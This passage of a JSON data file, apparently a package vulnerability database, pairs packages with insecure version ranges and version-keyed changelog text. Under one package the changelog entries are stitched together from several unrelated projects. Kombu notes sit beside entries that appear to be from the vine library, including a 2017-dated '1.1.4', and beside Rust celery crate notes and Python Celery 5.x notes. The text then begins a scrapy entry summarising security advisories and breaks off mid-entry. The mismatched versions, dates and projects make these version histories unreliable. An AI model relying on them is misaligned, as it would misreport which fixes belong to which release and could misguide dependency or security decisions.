a bug with asynchronously reading large messages.\n\n- pyamqp: Now requires amqp 0.9.3\n\n- Cleaned up test requirements.\n\n.. _version-2.4.3:\n\n", "2.4.3": "=====\n:release-date: 2012-08-25 10:30 P.M BST\n:release-by: Ask Solem\n\n- Fixed problem with amqp transport alias (Issue 154).\n\n.. _version-2.4.2:\n\n", "2.2.6": "=====\n:release-date: 2012-07-10 05:00 P.M BST\n:release-by: Ask Solem\n\n- Adds ``kombu.messaging.entry_to_queue`` for compat with previous versions.\n\n.. _version-2.2.5:\n\n", "2.2.5": "=====\n:release-date: 2012-07-10 05:00 P.M BST\n:release-by: Ask Solem\n\n- Pidbox: Now sets queue expire at 10 seconds for reply queues.\n\n- EventIO: Now ignores ``ValueError`` raised by epoll unregister.\n\n- MongoDB: Fixes Issue 142\n\n    Fix by Flavio Percoco Premoli\n\n.. _version-2.2.4:\n\n", "2.2.4": "=====\n:release-date: 2012-07-05 04:00 P.M BST\n:release-by: Ask Solem\n\n- Support for msgpack-python 0.2.0 (Issue 143)\n\n    The latest msgpack version no longer supports Python 2.5, so if you're\n    still using that you need to depend on an earlier msgpack-python version.\n\n    Fix contributed by Sebastian Insua\n\n- :func:`~kombu.common.maybe_declare` no longer caches entities with the\n  ``auto_delete`` flag set.\n\n- New experimental filesystem transport.\n\n    Contributed by Bobby Beever.\n\n- Virtual Transports: Now support anonymous queues and exchanges.\n\n.. _version-2.2.3:\n\n", "2.2.3": "=====\n:release-date: 2012-06-24 05:00 P.M BST\n:release-by: Ask Solem\n\n- ``BrokerConnection`` now renamed to ``Connection``.\n\n    The name ``Connection`` has been an alias for a very long time,\n    but now the rename is official in the documentation as well.\n\n    The Connection alias has been available since version 1.1.3,\n    and ``BrokerConnection`` will still work and is not deprecated.\n\n- ``Connection.clone()`` now works for the sqlalchemy transport.\n\n- :func:`kombu.common.eventloop`, :func:`kombu.utils.uuid`,\n  and :func:`kombu.utils.url.parse_url` can now be\n  imported from the :mod:`kombu` module directly.\n\n- Pidbox transport callback ``after_reply_message_received`` now happens\n  in a finally block.\n\n- Trying to use the ``librabbitmq://`` transport will now show the right\n  name in the :exc:`ImportError` if :mod:`librabbitmq` is not installed.\n\n    The librabbitmq falls back to the older ``pylibrabbitmq`` name for\n    compatibility reasons and would therefore show ``No module named\n    pylibrabbitmq`` instead of librabbitmq.\n\n\n.. _version-2.2.2:\n\n", "2.1.8": "=====\n:release-date: 2012-05-06 03:06 P.M BST\n:release-by: Ask Solem\n\n* Bound Exchange/Queue's are now pickleable.\n\n* Consumer/Producer can now be instantiated without a channel,\n  and only later bound using ``.revive(channel)``.\n\n* ProducerPool now takes ``Producer`` argument.\n\n* :func:`~kombu.utils.fxrange` now counts forever if the\n  stop argument is set to None.\n  (fxrange is like xrange but for decimals).\n\n* Auto delete support for virtual transports were incomplete\n  and could lead to problems so it was removed.\n\n* Cached declarations (:func:`~kombu.common.maybe_declare`)\n  are now bound to the underlying connection, so that\n  entities are redeclared if the connection is lost.\n\n    This also means that previously uncacheable entities\n    (e.g. non-durable) can now be cached.\n\n* compat ConsumerSet: can now specify channel.\n\n.. _version-2.1.7:\n\n", "2.1.7": "=====\n:release-date: 2012-04-27 06:00 P.M BST\n:release-by: Ask Solem\n\n* compat consumerset now accepts optional channel argument.\n\n.. _version-2.1.6:\n\n", "2.1.6": "=====\n:release-date: 2012-04-23 01:30 P.M BST\n:release-by: Ask Solem\n\n* SQLAlchemy transport was not working correctly after URL parser change.\n\n* maybe_declare now stores cached declarations per underlying connection\n  instead of globally, in the rare case that data disappears from the\n  broker after connection loss.\n\n* Django: Added South migrations.\n\n    Contributed by Joseph Crosland.\n\n.. _version-2.1.5:\n\n", "2.1.5": "=====\n:release-date: 2012-04-13 03:30 P.M BST\n:release-by: Ask Solem\n\n* The url parser removed more than the first leading slash (Issue 121).\n\n* SQLAlchemy: Can now specify url using + separator\n\n    Example:\n\n    .. code-block:: python\n\n        Connection('sqla+mysql://localhost/db')\n\n* Better support for anonymous queues (Issue 116).\n\n    Contributed by Michael Barrett.\n\n* ``Connection.as_uri`` now quotes url parts (Issue 117).\n\n* Beanstalk: Can now set message TTR as a message property.\n\n    Contributed by Andrii Kostenko\n\n.. _version-2.1.4:\n\n", "1.5.1": "=====\n:release-date: 2011-11-30 01:00 P.M GMT\n:release-by: Ask Solem\n\n* Fixes issue with ``kombu.compat`` introduced in 1.5.0 (Issue 83).\n\n* Adds the ability to disable content_types in the serializer registry.\n\n    Any message with a content type that is disabled will be refused.\n    One example would be to disable the Pickle serializer:\n\n        >>> from kombu.serialization import registry\n         by name\n        >>> registry.disable('pickle')\n         or by mime-type.\n        >>> registry.disable('application/x-python-serialize')\n\n.. _version-1.5.0:\n\n", "1.5.0": "=====\n:release-date: 2011-11-27 06:00 P.M GMT\n:release-by: Ask Solem\n\n* kombu.pools: Fixed a bug resulting in resources not being properly released.\n\n  This was caused by the use of ``__hash__`` to distinguish them.\n\n* Virtual transports: Dead-letter queue is now disabled by default.\n\n    The dead-letter queue was enabled by default to help application\n    authors, but now that Kombu is stable it should be removed.\n    There are after all many cases where messages should just be dropped\n    when there are no queues to buffer them, and keeping them without\n    supporting automatic cleanup is rather considered a resource leak\n    than a feature.\n\n    If wanted the dead-letter queue can still be enabled, by using\n    the ``deadletter_queue`` transport option:\n\n    .. code-block:: pycon\n\n        >>> x = Connection('redis://',\n        ...       transport_options={'deadletter_queue': 'ae.undeliver'})\n\n    In addition, an :class:`UndeliverableWarning` is now emitted when\n    the dead-letter queue is enabled and a message ends up there.\n\n    Contributed by Ionel Maries Cristian.\n\n* MongoDB transport now supports Replicasets (Issue 81).\n\n    Contributed by Ivan Metzlar.\n\n* The ``Connection.ensure`` methods now accepts a ``max_retries`` value\n  of 0.\n\n    A value of 0 now means *do not retry*, which is distinct from :const:`None`\n    which means *retry indefinitely*.\n\n    Contributed by Dan McGee.\n\n* SQS Transport: Now has a lowercase ``sqs`` alias, so that it can be\n  used with broker URLs (Issue 82).\n\n    Fix contributed by Hong Minhee\n\n* SQS Transport: Fixes KeyError on message acknowledgments (Issue 73).\n\n    The SQS transport now uses UUID's for delivery tags, rather than\n    a counter.\n\n    Fix contributed by Brian Bernstein.\n\n* SQS Transport: Unicode related fixes (Issue 82).\n\n    Fix contributed by Hong Minhee.\n\n* Redis version check could crash because of improper handling of types\n  (Issue 63).\n\n* Fixed error with `Resource.force_close_all` when resources\n  were not yet properly initialized (Issue 78).\n\n.. _version-1.4.3:\n\n", "1.3.5": "=====\n:release-date: 2011-09-16 06:00 P.M BST\n:release-by: Ask Solem\n\n* Python 3: AMQP_PROTOCOL_HEADER must be bytes, not str.\n\n.. _version-1.3.4:\n\n", "1.3.4": "=====\n:release-date: 2011-09-16 06:00 P.M BST\n:release-by: Ask Solem\n\n* Fixes syntax error in pools.reset\n\n\n.. _version-1.3.3:\n\n", "1.1.6": "=====\n:release-date: 2011-06-13 04:00 P.M BST\n:release-by: Ask Solem\n\n* Redis: Fixes issue introduced in 1.1.4, where a redis connection\n  failure could leave consumer hanging forever.\n\n* SQS: Now supports fanout messaging by using SimpleDB to store routing\n  tables.\n\n    This can be disabled by setting the `supports_fanout` transport option:\n\n        >>> Connection(transport='SQS',\n        ...            transport_options={'supports_fanout': False})\n\n* SQS: Now properly deletes a message when a message is acked.\n\n* SQS: Can now set the Amazon AWS region, by using the ``region``\n  transport option.\n\n* amqplib: Now uses `localhost` as default hostname instead of raising an\n  error.\n\n.. _version-1.1.5:\n\n", "1.1.5": "=====\n:release-date: 2011-06-07 06:00 P.M BST\n:release-by: Ask Solem\n\n* Fixes compatibility with redis-py 2.4.4.\n\n.. _version-1.1.4:\n\n", "1.1.4": "=====\n:release-date: 2017-07-16 10:30 P.M UTC+2\n:release-by: Ask Solem\n\n- Added official support for Python 3.5 & 3.6.\n- Improve Python 2/3 compatibility.\n- Don't set mutable default values to keyword arguments.\n\n.. _version-1.1.3:\n\n", "1.1.3": "=====\n:release-date: 2016-10-13 06:02 P.M PDT\n:release-by: Ask Solem\n\n- New ``promise(fun, weak=True)`` argument, creates weakref to callback.\n\n.. _version-1.1.2:\n\n", "1.1.2": "=====\n:release-date: 2016-09-07 04:18 P.M PDT\n:release-by: Ask Solem\n\n- barrier: now handles the case where len(promises) returns NotImplemented.\n\n.. _version-1.1.1:\n\n", "1.1.1": "=====\n:release-date: 2016-06-30 12:05 P.M PDT\n:release-by: Ask Solem\n\n- Requirements: Tests now depends on :pypi:`case` 1.2.2\n\n- Five: python_2_unicode_compatible now ensures `__repr__` returns\n  bytes on Python 2.\n\n.. _version-1.1.0:\n\n", "0.1.0": "=====\n:release-date: 2010-07-22 04:20 P.M CET\n:release-by: Ask Solem\n\n* Initial fork of carrot\n\n\nChanges\n=======\n\n.. _version-5.1.0:\n\n", "0.4.0rc4": "\n Added\n\n- Added a `MockBroker` for internal testing.\n- Added more tests to the `app` module.\n- Added a `prelude` module.\n- Added support for YAML, MsgPack, and Pickle content types, behind the `extra_content_types` feature flag.\n\n Changed\n\n- Improved `TaskResultExt`. Now takes a `FnOnce() -> Context` instead of `&str`.\n\n Fixed\n\n- Ensure a `Signature` inherits default `TaskOptions` from the corresponding `Task` and `Celery` or `Beat` app.\n- Cleaned up remaining uses of `.unwrap()` in the library.\n- Options returned with `Task::options()` now have the current values, where app-level values are overridden by task-level values.\n\n", "0.4.0rc3": "\n Added\n\n- Added a `.display_pretty()` method on the `Celery` struct that prints out a cool ASCII logo\n  with some useful information about the app.\n- Added an `AsyncResult` struct that acts as a handler for task results.\n- Added `Task::retry_with_countdown` and `Task::retry_with_eta` trait methods so that tasks can\n  manually trigger a retry.\n\n Changed\n\n- Fields of the `Signature` struct made private to avoid confusion around which fields of `TaskOptions` apply to a `Signature`.\n- `Celery::send_task` now returns an `AsyncResult` instead of a `String` for the `Ok` variant.\n- Renamed `DummyBackend` to `LocalSchedulerBackend`.\n- Switched to [`thiserror`](https://github.com/dtolnay/thiserror) for the error module instead of the deprecated `failure` crate.\n\n Fixed\n\n- Fixed bug where `hard_time_limit` was ignored by worker if only specified at the app or task level.\n\n", "0.4.0rc2": "\n Added\n\n- Added a `reconnect` method on the `Broker`.\n\n Changed\n\n- `Celery` and `Beat` apps will automatically try to reconnect the broker when the connection fails.\n\n", "0.4.0rc1": "\n Added\n\n- Added a `hard_time_limit` task option for compatability with Python.\n\n Changed\n\n- The `timeout` task option was renamed to `time_limit` to be more consistent with the Python API.\n\n Fixed\n\n- Compiles on Windows\n\n", "0.3.1": "\n Added\n\n- `beat` module with basic support for scheduling tasks.\n- `beat` macro to create a `Beat` app.\n\n", "0.3.0": "\n Changed\n\n- `lapin` dependency updated to 1.0.\n- `BrokerError` variants trimmed and simplified.\n- The error handler closure passed to `Broker::consume` now takes a `BrokerError` as an argument.\n- Improved error messages.\n\n", "0.2.6": "\n Fixed\n\n- `Message::headers::origin` field fixed. Before it included quotes around the hostname.\n\n Added\n\n- `Request::hostname` field now populated by the `Celery` app consuming the task.\n\n Changed\n\n- Sending a task `with_timeout` will only set the `soft_time_limit` so that the behavior\nis the same for Python consumers.\n\n", "0.2.5": "\n Changed\n\n- Tasks must explicitly return a `TaskResult<T>` now.\n\n", "0.2.4": "\n Added\n\n- A `retry_for_unexpected` task configuration option. By default this is `true` (so the default behavior is unchanged).\nBut if set to `false`, tasks that raised `TaskError::UnexpectedError` won't be retried.\n\n", "0.2.3": "\n Changed\n\n- `CeleryBuilder::task_route` now infallible. Error could be raised during the `build` phase instead.\n- `Celery::consume_from` will return `Err(CeleryError::NoQueueToConsume)` if the slice of queues is empty.\n\n", "0.2.2": "\n Changed\n\n- `Celery::consume_from` now takes multiple queues instead of just a single queue.\n- Retry ETA method moved from tracer to task so that it can be customized.\n- `TaskError` variants restricted to only `ExpectedError`, `UnexpectedError`, and `TimeoutError`. The `Retry` and `ExpirationError` variants moved to a new (non-public) error type: `TracerError`.\n\n", "0.2.1": "\n Added\n\n- `on_failure` and `on_success` options to `task` attribute macro.\n\n Changed\n\n- Removed `task_id` and `params` arguments to `on_failure` and `on_success` callbacks, since those can be gotten from the request object.\n\n", "0.2.0": "\n Added\n\n- A `Signature` struct with includes task execution options (previously the fields in `TaskSendOptions`).\n- A `bind` argument to the `task` macro. When `bind = true` is given, the task will be run as an instance method.\n- A `Request` struct.\n\n Changed\n\n- `protocol::TryIntoMessage` trait renamed to `TryCreateMessage` and the one trait function `try_into_message` renamed to `try_create_message` to better reflect the fact that the trait function does not consume `self`.\n- Task parameters are now separated from task struct.\n- Task callback methods `on_failure` and `on_success` are now instance methods.\n- `Celery::send_task` now takes a `Signature` instead of a `Task`.\n- When tasks are defined through the `task` macro by annotating a function, that function needs to be explicitly marked async for the function to use async / await syntax.\n\n Removed\n\n- `TaskContext` struct.\n- `TaskSendOptions`.\n- `Celery::send_task_with`.\n\n", "0.2.0alpha.2": "\n Changed\n\n- Uses of `std::sync::Mutex` and `std::sync::RwLock` changed to their async-aware equivalents from `tokio`.\n- The `Celery::register_task` method is now an async function due to the above.\n- Fixed bug where tasks with a future ETA were acked before they were due, resulting in such tasks being lost if the worker was shutdown before they were due.\n\n Removed\n\n- The `SyncError` variants have been removed.\n\n", "0.2.0alpha.1": "\n Changed\n\n- `Celery::consume_from` now only accepts a single queue (once again) since there was a critical bug when we allowed consuming from multiple queues.\n\n", "0.2.0alpha.0": "\n Added\n\n- Several error enums: `CeleryError`, `TaskError`, `BrokerError`, `ProtocolError`.\n- `TaskResultExt` for easily converting the error type in a `Result` to a `TaskError` variant.\n\n Changed\n\n- The `error` module.\n- The structure of the public API is now more compact. We expose a few more modules, including `broker`, `task`, and `error` instead of exporting all of the public elements from the crate root.\n- The `app` macro (previously `celery_app`) no longer takes an actual broker type (like `AMQPBroker`) for the `broker` parameter. Instead you can just use the literal token `AMQP`. This means one less import for the user.\n\n Removed\n\n- The `Error` type.\n- The `celery_app` macro has been renamed to just `app`.\n- The `ResultExt` re-export.\n\n\n.. _changelog:\n\n================\n Change history\n================\n\nThis document contains change notes for bugfix & new features\nin the main branch & 5.5.x series, please see :ref:`whatsnew-5.5` for\nan overview of what's new in Celery 5.5.\n\n.. _version-5.5.0b1:\n\n", "5.5.0b1": "=======\n\n:release-date: 2024-07-24\n:release-by: Tomer Nosrati\n\nCelery v5.5.0 Beta 1 is now available for testing.\nPlease help us test this version and report any issues.\n\nKey Highlights\n~~~~~~~~~~~~~~\n\nRedis Broker Stability Improvements\n-----------------------------------\nThe root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_\nin the release-candidate for Kombu v5.4.0. This beta release has been upgraded to use the new\nKombu RC version, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues:\n`7276 <https://github.com/celery/celery/discussions/7276>`_,\n`8091 <https://github.com/celery/celery/discussions/8091>`_,\n`8030 <https://github.com/celery/celery/discussions/8030>`_,\n`8384 <https://github.com/celery/celery/discussions/8384>`_\n\nQuorum Queues Initial Support\n-----------------------------\nThis release introduces the initial support for Quorum Queues with Celery. \n\nSee new configuration options for more details:\n\n- :setting:`task_default_queue_type`\n- :setting:`worker_detect_quorum_queues`\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues:\n`6067 <https://github.com/celery/celery/discussions/6067>`_,\n`9121 <https://github.com/celery/celery/discussions/9121>`_\n\nWhat's Changed\n~~~~~~~~~~~~~~\n\n- (docs): use correct version celery v.5.4.x (8975)\n- Update mypy to 1.10.0 (8977)\n- Limit pymongo<4.7 when Python <= 3.10 due to breaking changes in 4.7 (8988)\n- Bump pytest from 8.1.1 to 8.2.0 (8987)\n- Update README to Include FastAPI in Framework Integration Section (8978)\n- Clarify return values of ..._on_commit methods (8984)\n- add kafka broker docs (8935)\n- Limit pymongo<4.7 regardless of Python version (8999)\n- Update pymongo[srv] requirement from <4.7,>=4.0.2 to >=4.0.2,<4.8 (9000)\n- Update elasticsearch requirement from <=8.13.0 to <=8.13.1 (9004)\n- security: SecureSerializer: support generic low-level serializers (8982)\n- don't kill if pid same as file (8997) (8998)\n- Update cryptography to 42.0.6 (9005)\n- Bump cryptography from 42.0.6 to 42.0.7 (9009)\n- Added -vv to unit, integration and smoke tests (9014)\n- SecuritySerializer: ensure pack separator will not be conflicted with serialized fields (9010)\n- Update sphinx-click to 5.2.2 (9025)\n- Bump sphinx-click from 5.2.2 to 6.0.0 (9029)\n- Fix a typo to display the help message in first-steps-with-django (9036)\n- Pinned requests to v2.31.0 due to docker-py bug 3256 (9039)\n- Fix certificate validity check (9037)\n- Revert \"Pinned requests to v2.31.0 due to docker-py bug 3256\" (9043)\n- Bump pytest from 8.2.0 to 8.2.1 (9035)\n- Update elasticsearch requirement from <=8.13.1 to <=8.13.2 (9045)\n- Fix detection of custom task set as class attribute with Django (9038)\n- Update elastic-transport requirement from <=8.13.0 to <=8.13.1 (9050)\n- Bump pycouchdb from 1.14.2 to 1.16.0 (9052)\n- Update pytest to 8.2.2 (9060)\n- Bump cryptography from 42.0.7 to 42.0.8 (9061)\n- Update elasticsearch requirement from <=8.13.2 to <=8.14.0 (9069)\n- [enhance feature] Crontab schedule: allow using month names (9068)\n- Enhance tox environment: [testenv:clean] (9072)\n- Clarify docs about Reserve one task at a time (9073)\n- GCS docs fixes (9075)\n- Use hub.remove_writer instead of hub.remove for write fds (4185) (9055)\n- Class method to process crontab string (9079)\n- Fixed smoke tests env bug when using integration tasks that rely on Redis (9090)\n- Bugfix - a task will run multiple times when chaining chains with groups (9021)\n- Bump mypy from 1.10.0 to 1.10.1 (9096)\n- Don't add a separator to global_keyprefix if it already has one (9080)\n- Update pymongo[srv] requirement from <4.8,>=4.0.2 to >=4.0.2,<4.9 (9111)\n- Added missing import in examples for Django (9099)\n- Bump Kombu to v5.4.0rc1 (9117)\n- Removed skipping Redis in t/smoke/tests/test_consumer.py tests (9118)\n- Update pytest-subtests to 0.13.0 (9120)\n- Increased smoke tests CI timeout (9122)\n- Bump Kombu to v5.4.0rc2 (9127)\n- Update zstandard to 0.23.0 (9129)\n- Update pytest-subtests to 0.13.1 (9130)\n- Changed retry to tenacity in smoke tests (9133)\n- Bump mypy from 1.10.1 to 1.11.0 (9135)\n- Update cryptography to 43.0.0 (9138)\n- Update pytest to 8.3.1 (9137)\n- Added support for Quorum Queues (9121)\n- Bump Kombu to v5.4.0rc3 (9139)\n- Cleanup in Changelog.rst (9141)\n- Update Django docs for CELERY_CACHE_BACKEND (9143)\n- Added missing docs to previous releases (9144)\n- Fixed a few documentation build warnings (9145)\n- docs(README): link invalid (9148)\n- Prepare for (pre) release: v5.5.0b1 (9146)\n\n.. _version-5.4.0:\n\n", "5.4.0": "=====\n\n:release-date: 2024-04-17\n:release-by: Tomer Nosrati\n\nCelery v5.4.0 and v5.3.x have consistently focused on enhancing the overall QA, both internally and externally.\nThis effort led to the new pytest-celery v1.0.0 release, developed concurrently with v5.3.0 & v5.4.0.\n\nThis release introduces two significant QA enhancements:\n\n- **Smoke Tests**: A new layer of automatic tests has been added to Celery's standard CI. These tests are designed to handle production scenarios and complex conditions efficiently. While new contributions will not be halted due to the lack of smoke tests, we will request smoke tests for advanced changes where appropriate.\n- `Standalone Bug Report Script <https://docs.celeryq.dev/projects/pytest-celery/en/latest/userguide/celery-bug-report.html>`_: The new pytest-celery plugin now allows for encapsulating a complete Celery dockerized setup within a single pytest script. Incorporating these into new bug reports will enable us to reproduce reported bugs deterministically, potentially speeding up the resolution process.\n\nContrary to the positive developments above, there have been numerous reports about issues with the Redis broker malfunctioning\nupon restarts and disconnections. Our initial attempts to resolve this were not successful (8796).\nWith our enhanced QA capabilities, we are now prepared to address the core issue with Redis (as a broker) again.\n\nThe rest of the changes for this release are grouped below, with the changes from the latest release candidate listed at the end.\n\nChanges\n~~~~~~~\n- Add a Task class specialised for Django (8491)\n- Add Google Cloud Storage (GCS) backend (8868)\n- Added documentation to the smoke tests infra (8970)\n- Added a checklist item for using pytest-celery in a bug report (8971)\n- Bugfix: Missing id on chain (8798)\n- Bugfix: Worker not consuming tasks after Redis broker restart (8796)\n- Catch UnicodeDecodeError when opening corrupt beat-schedule.db (8806)\n- chore(ci): Enhance CI with `workflow_dispatch` for targeted debugging and testing (8826)\n- Doc: Enhance \"Testing with Celery\" section (8955)\n- Docfix: pip install celery[sqs] -> pip install \"celery[sqs]\" (8829)\n- Enable efficient `chord` when using dynamicdb as backend store (8783)\n- feat(daemon): allows daemonization options to be fetched from app settings (8553)\n- Fix DeprecationWarning: datetime.datetime.utcnow() (8726)\n- Fix recursive result parents on group in middle of chain (8903)\n- Fix typos and grammar (8915)\n- Fixed version documentation tag from 8553 in configuration.rst (8802)\n- Hotfix: Smoke tests didn't allow customizing the worker's command arguments, now it does (8937)\n- Make custom remote control commands available in CLI (8489)\n- Print safe_say() to stdout for non-error flows (8919)\n- Support moto 5.0 (8838)\n- Update contributing guide to use ssh upstream url (8881)\n- Update optimizing.rst (8945)\n- Updated concurrency docs page. (8753)\n\nDependencies Updates\n~~~~~~~~~~~~~~~~~~~~\n- Bump actions/setup-python from 4 to 5 (8701)\n- Bump codecov/codecov-action from 3 to 4 (8831)\n- Bump isort from 5.12.0 to 5.13.2 (8772)\n- Bump msgpack from 1.0.7 to 1.0.8 (8885)\n- Bump mypy from 1.8.0 to 1.9.0 (8898)\n- Bump pre-commit to 3.6.1 (8839)\n- Bump pre-commit/action from 3.0.0 to 3.0.1 (8835)\n- Bump pytest from 8.0.2 to 8.1.1 (8901)\n- Bump pytest-celery to v1.0.0 (8962)\n- Bump pytest-cov to 5.0.0 (8924)\n- Bump pytest-order from 1.2.0 to 1.2.1 (8941)\n- Bump pytest-subtests from 0.11.0 to 0.12.1 (8896)\n- Bump pytest-timeout from 2.2.0 to 2.3.1 (8894)\n- Bump python-memcached from 1.59 to 1.61 (8776)\n- Bump sphinx-click from 4.4.0 to 5.1.0 (8774)\n- Update cryptography to 42.0.5 (8869)\n- Update elastic-transport requirement from <=8.12.0 to <=8.13.0 (8933)\n- Update elasticsearch requirement from <=8.12.1 to <=8.13.0 (8934)\n- Upgraded Sphinx from v5.3.0 to v7.x.x (8803)\n\n", "5.4": "environments. The release candidate version is available for testing.\nThe official release is planned for March-April 2024.\n\n- New Config: worker_enable_prefetch_count_reduction (8581)\n- Added \"Serverless\" section to Redis doc (redis.rst) (8640)\n- Upstash's Celery example repo link fix (8665)\n- Update mypy version (8679)\n- Update cryptography dependency to 41.0.7 (8690)\n- Add type annotations to celery/utils/nodenames.py (8667)\n- Issue 3426. Adding myself to the contributors. (8696)\n- Bump actions/setup-python from 4 to 5 (8701)\n- Fixed bug where chord.link_error() throws an exception on a dict type errback object (8702)\n- Bump github/codeql-action from 2 to 3 (8725)\n- Fixed multiprocessing integration tests not running on Mac (8727)\n- Added make docker-docs (8729)\n- Fix DeprecationWarning: datetime.datetime.utcnow() (8726)\n- Remove `new` adjective in docs (8743)\n- add type annotation to celery/utils/sysinfo.py (8747)\n- add type annotation to celery/utils/iso8601.py (8750)\n- Change type annotation to celery/utils/iso8601.py (8752)\n- Update test deps (8754)\n- Mark flaky: test_asyncresult_get_cancels_subscription() (8757)\n- change _read_as_base64 (b64encode returns bytes) on celery/utils/term.py (8759)\n- Replace string concatenation with fstring on celery/utils/term.py (8760)\n- Add type annotation to celery/utils/term.py (8755)\n- Skipping test_tasks::test_task_accepted (8761)\n- Updated concurrency docs page. (8753)\n- Changed pyup -> dependabot for updating dependencies (8764)\n- Bump isort from 5.12.0 to 5.13.2 (8772)\n- Update elasticsearch requirement from <=8.11.0 to <=8.11.1 (8775)\n- Bump sphinx-click from 4.4.0 to 5.1.0 (8774)\n- Bump python-memcached from 1.59 to 1.61 (8776)\n- Update elastic-transport requirement from <=8.10.0 to <=8.11.0 (8780)\n- python-memcached==1.61 -> python-memcached>=1.61 (8787)\n- Remove usage of utcnow (8791)\n- Smoke Tests (8793)\n- Moved smoke tests to their own workflow (8797)\n- Bugfix: Worker not consuming tasks after Redis broker restart (8796)\n- Bugfix: Missing id on chain (8798)\n\n.. _version-5.3.6:\n\n", "5.2.7": "=====\n\n:release-date: 2022-5-26 12:15 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Fix packaging issue which causes poetry 1.2b1 and above to fail install Celery (7534).\n\n.. _version-5.2.6:\n\n", "5.2.6": "=====\n\n:release-date: 2022-4-04 21:15 P.M UTC+2:00\n:release-by: Omer Katz\n\n- load_extension_class_names - correct module_name (7433).\n    This fixes a regression caused by 7218.\n\n.. _version-5.2.5:\n\n", "5.2.5": "=====\n\n:release-date: 2022-4-03 20:42 P.M UTC+2:00\n:release-by: Omer Katz\n\n**This release was yanked due to a regression caused by the PR below**\n\n- Use importlib instead of deprecated pkg_resources (7218).\n\n.. _version-5.2.4:\n\n", "5.2.0rc2": "========\n\n:release-date: 2021-11-02 1.54 P.M UTC+3:00\n:release-by: Naomi Elstein\n\n- Bump Python 3.10.0 to rc2.\n- [pre-commit.ci] pre-commit autoupdate (6972).\n- autopep8.\n- Prevent worker to send expired revoked items upon hello command (6975).\n- docs: clarify the 'keeping results' section (6979).\n- Update deprecated task module removal in 5.0 documentation (6981).\n- [pre-commit.ci] pre-commit autoupdate.\n- try python 3.10 GA.\n- mention python 3.10 on readme.\n- Documenting the default consumer_timeout value for rabbitmq >= 3.8.15.\n- Azure blockblob backend parametrized connection/read timeouts (6978).\n- Add as_uri method to azure block blob backend.\n- Add possibility to override backend implementation with celeryconfig (6879).\n- [pre-commit.ci] pre-commit autoupdate.\n- try to fix deprecation warning.\n- [pre-commit.ci] pre-commit autoupdate.\n- not needed anyore.\n- not needed anyore.\n- not used anymore.\n- add github discussions forum\n\n.. _version-5.2.0rc1:\n\n", "5.2.0b3": "=======\n\n:release-date: 2021-09-02 8.38 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Add args to LOG_RECEIVED (fixes 6885) (6898).\n- Terminate job implementation for eventlet concurrency backend (6917).\n- Add cleanup implementation to filesystem backend (6919).\n- [pre-commit.ci] pre-commit autoupdate (69).\n- Add before_start hook (fixes 4110) (6923).\n- Restart consumer if connection drops (6930).\n- Remove outdated optimization documentation (6933).\n- added https verification check functionality in arangodb backend (6800).\n- Drop Python 3.6 support.\n- update supported python versions on readme.\n- [pre-commit.ci] pre-commit autoupdate (6935).\n- Remove appveyor configuration since we migrated to GA.\n- pyugrade is now set to upgrade code to 3.7.\n- Drop exclude statement since we no longer test with pypy-3.6.\n- 3.10 is not GA so it's not supported yet.\n- Celery 5.1 or earlier support Python 3.6.\n- Fix linting error.\n- fix: Pass a Context when chaining fail results (6899).\n- Bump version: 5.2.0b2 \u2192 5.2.0b3.\n\n.. _version-5.2.0b2:\n\n", "5.2.0b2": "=======\n\n:release-date: 2021-08-17 5.35 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Test windows on py3.10rc1 and pypy3.7 (6868).\n- Route chord_unlock task to the same queue as chord body (6896).\n- Add message properties to app.tasks.Context (6818).\n- handle already converted LogLevel and JSON (6915).\n- 5.2 is codenamed dawn-chorus.\n- Bump version: 5.2.0b1 \u2192 5.2.0b2.\n\n.. _version-5.2.0b1:\n\n", "5.2.0b1": "=======\n\n:release-date: 2021-08-11 5.42 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Add Python 3.10 support (6807).\n- Fix docstring for Signal.send to match code (6835).\n- No blank line in log output (6838).\n- Chords get body_type independently to handle cases where body.type does not exist (6847).\n- Fix 6844 by allowing safe queries via app.inspect().active() (6849).\n- Fix multithreaded backend usage (6851).\n- Fix Open Collective donate button (6848).\n- Fix setting worker concurrency option after signal (6853).\n- Make ResultSet.on_ready promise hold a weakref to self (6784).\n- Update configuration.rst.\n- Discard jobs on flush if synack isn't enabled (6863).\n- Bump click version to 8.0 (6861).\n- Amend IRC network link to Libera (6837).\n- Import celery lazily in pytest plugin and unignore flake8 F821, \"undefined name '...'\" (6872).\n- Fix inspect --json output to return valid json without --quiet.\n- Remove celery.task references in modules, docs (6869).\n-  The Consul backend must correctly associate requests and responses (6823).\n"}}, {"name": "scrapy", "insecurity": ["<1.8.1", "<1.8.2", "<1.8.3", "<1.8.4", "<2.11.2", ">=0,<0.24.0", ">=0,<1.8.2", ">=0,<1.8.4", ">=0.7,<=2.11.1", ">=2,<2.11.1", ">=2,<2.6.2", ">=2.0.0,<2.11.1", ">=2.0.0,<2.5.1", ">=2.0.0,<2.6.0", ">=2.0.0,<2.6.2"], "changelog": {"2.11.2": "--------------------------\n\nSecurity bug fixes\n~~~~~~~~~~~~~~~~~~\n\n-   Redirects to non-HTTP protocols are no longer followed. Please, see the\n    `23j4-mw76-5v7h security advisory`_ for more information. (:issue:`457`)\n\n    .. _23j4-mw76-5v7h security advisory: https://github.com/scrapy/scrapy/security/advisories/GHSA-23j4-mw76-5v7h\n\n-   The ``Authorization`` header is now dropped on redirects to a different\n    scheme (``http://`` or ``https://``) or port, even if the domain is the\n    same. Please, see the `4qqq-9vqf-3h3f security advisory`_ for more\n    information.\n\n    .. _4qqq-9vqf-3h3f security advisory: https://github.com/scrapy/scrapy/security/advisories/GHSA-4qqq-9vqf-3h3f\n\n-   When using system proxy settings that are different for ``http://`` and\n    ``https://``, redirects to a different URL scheme will now also trigger the\n    corresponding change in proxy settings for the redirected request. Please,\n    see the `jm3v-qxmh-hxwv security advisory`_ for more information.\n    (:issue:`767`)\n\n    .. _jm3v-qxmh-hxwv security advisory: https://github.com/scrapy/scrapy/security/advisories/GHSA-jm3v-qxmh-hxwv\n\n-   :attr:`Spider.allowed_domains <scrapy.Spider.allowed_domains>` is now\n    enforced for all requests, and not only requests from spider callbacks.\n    (:issue:`1042`, :issue:`2241`, 